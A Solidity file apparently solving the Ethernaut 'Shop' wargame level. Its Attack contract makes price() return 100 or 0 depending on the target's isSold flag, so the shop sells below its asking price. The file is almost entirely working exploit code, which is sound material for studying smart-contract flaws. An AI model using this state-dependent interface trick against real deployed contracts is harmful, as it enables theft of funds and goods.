// SPDX-License-Identifier: MIT

// Shop 
// https://ethernaut.openzeppelin.com/level/0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB

pragma solidity >=0.7.0 <0.9.0;

interface Target {
    // since isSold is a public variable, the EVM automatically creates a getter function for viewing it
    function isSold() external view returns (bool);

    // entry point for target contract
    function buy() external;
}

contract Attack {
    Target target = Target(0xTARGET_CONTRACT_ADDR);

    constructor() {}

    function price() external view returns (uint) {
        // at first i thought about doing some math on remaining gas but that seemed hard
        if (!target.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }
    
    // entry point for this attack contract
    function doit() public {
        target.buy();
    }
}
